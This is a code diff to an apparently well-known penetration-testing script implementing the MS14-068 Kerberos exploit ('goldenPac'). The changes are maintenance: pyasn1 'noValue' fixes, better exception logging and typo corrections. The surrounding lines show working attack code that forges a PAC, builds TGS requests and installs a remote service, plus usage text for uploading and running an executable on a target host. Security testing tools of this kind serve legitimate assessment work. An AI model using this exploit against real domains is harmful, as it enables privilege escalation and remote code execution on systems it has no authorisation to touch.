@@ -181,7 +181,8 @@ class PSEXEC:
 
         except SystemExit:
             raise
-        except:
+        except Exception as e:
+            logging.debug(str(e))
             if unInstalled is False:
                 installService.uninstall()
                 if self.__copyFile is not None:
@@ -202,8 +203,7 @@ class PSEXEC:
                 pass
 
         if tries == 0:
-            logging.critical('Pipe not ready, aborting')
-            raise
+            raise Exception('Pipe not ready, aborting')
 
         fid = s.openFile(tid,pipe,accessMask, creationOption = 0x40, fileAttributes = 0x80)
 
@@ -659,7 +659,7 @@ class MS14_068:
         pacType['Buffers'] = buffers + buffersTail
 
         authorizationData = AuthorizationData()
-        authorizationData[0] = None
+        authorizationData[0] = noValue
         authorizationData[0]['ad-type'] = int(constants.AuthorizationDataType.AD_WIN2K_PAC.value)
         authorizationData[0]['ad-data'] = str(pacType)
         return encoder.encode(authorizationData)
@@ -676,7 +676,7 @@ class MS14_068:
 
         # Now put the goldenPac inside the AuthorizationData AD_IF_RELEVANT
         ifRelevant = AD_IF_RELEVANT()
-        ifRelevant[0] = None
+        ifRelevant[0] = noValue
         ifRelevant[0]['ad-type'] = int(constants.AuthorizationDataType.AD_IF_RELEVANT.value)
         ifRelevant[0]['ad-data'] = goldenPAC
 
@@ -704,7 +704,7 @@ class MS14_068:
         reqBody['till'] = KerberosTime.to_asn1(now)
         reqBody['nonce'] = random.SystemRandom().getrandbits(31)
         seq_set_iter(reqBody, 'etype', (cipher.enctype,))
-        reqBody['enc-authorization-data'] = None
+        reqBody['enc-authorization-data'] = noValue
         reqBody['enc-authorization-data']['etype'] = int(cipher.enctype)
         reqBody['enc-authorization-data']['cipher'] = encryptedEncodedIfRelevant
 
@@ -737,7 +737,7 @@ class MS14_068:
         # key (Section 5.5.1)
         encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)
 
-        apReq['authenticator'] = None
+        apReq['authenticator'] = noValue
         apReq['authenticator']['etype'] = cipher.enctype
         apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator
 
@@ -745,8 +745,8 @@ class MS14_068:
 
         tgsReq['pvno'] =  5
         tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
-        tgsReq['padata'] = None
-        tgsReq['padata'][0] = None
+        tgsReq['padata'] = noValue
+        tgsReq['padata'][0] = noValue
         tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
         tgsReq['padata'][0]['padata-value'] = encodedApReq
 
@@ -754,7 +754,7 @@ class MS14_068:
         pacRequest['include-pac'] = False
         encodedPacRequest = encoder.encode(pacRequest)
 
-        tgsReq['padata'][1] = None
+        tgsReq['padata'][1] = noValue
         tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
         tgsReq['padata'][1]['padata-value'] = encodedPacRequest
 
@@ -1028,6 +1028,7 @@ if __name__ == '__main__':
     import sys
     try:
         import pyasn1
+        from pyasn1.type.univ import noValue
     except ImportError:
          logging.critical('This module needs pyasn1 installed')
          logging.critical('You can get it from https://pypi.python.org/pypi/pyasn1')
@@ -1068,10 +1069,10 @@ if __name__ == '__main__':
     parser.add_argument('-w', action='store', metavar="pathname",
                         help='writes the golden ticket in CCache format into the <pathname> file')
     parser.add_argument('-dc-ip', action='store', metavar="ip address",
-                        help='IP Address of the domain controller (needed to get the user''s SID). If ommited it use '
+                        help='IP Address of the domain controller (needed to get the user''s SID). If omitted it will use '
                              'the domain part (FQDN) specified in the target parameter')
     parser.add_argument('-target-ip', action='store', metavar="ip address",
-                        help='IP Address of the target host you want to attack. If ommited it will use the targetName '
+                        help='IP Address of the target host you want to attack. If omitted it will use the targetName '
                              'parameter')
 
     group = parser.add_argument_group('authentication')
@@ -1084,7 +1085,7 @@ if __name__ == '__main__':
         print "\tthe password will be asked, or\n"
         print "\tpython goldenPac.py domain.net/normaluser:mypwd@domain-host\n"
         print "\tif domain.net and/or domain-machine do not resolve, add them"
-        print "\tto the hosts file or explicity specify the domain IP (e.g. 1.1.1.1) and target IP:\n"
+        print "\tto the hosts file or explicitly specify the domain IP (e.g. 1.1.1.1) and target IP:\n"
         print "\tpython goldenPac.py -dc-ip 1.1.1.1 -target-ip 2.2.2.2 domain.net/normaluser:mypwd@domain-host\n"
         print "\tThis will upload the xxx.exe file and execute it as: xxx.exe param1 param2 paramn"
         print "\tpython goldenPac.py -c xxx.exe domain.net/normaluser:mypwd@domain-host param1 param2 paramn\n"
@@ -1125,7 +1126,8 @@ if __name__ == '__main__':
     try:
         dumper.exploit()
     except Exception, e:
-        #import traceback
-        #print traceback.print_exc()
+        if logging.getLogger().level == logging.DEBUG:
+            import traceback
+            traceback.print_exc()
         logging.critical(str(e))
 
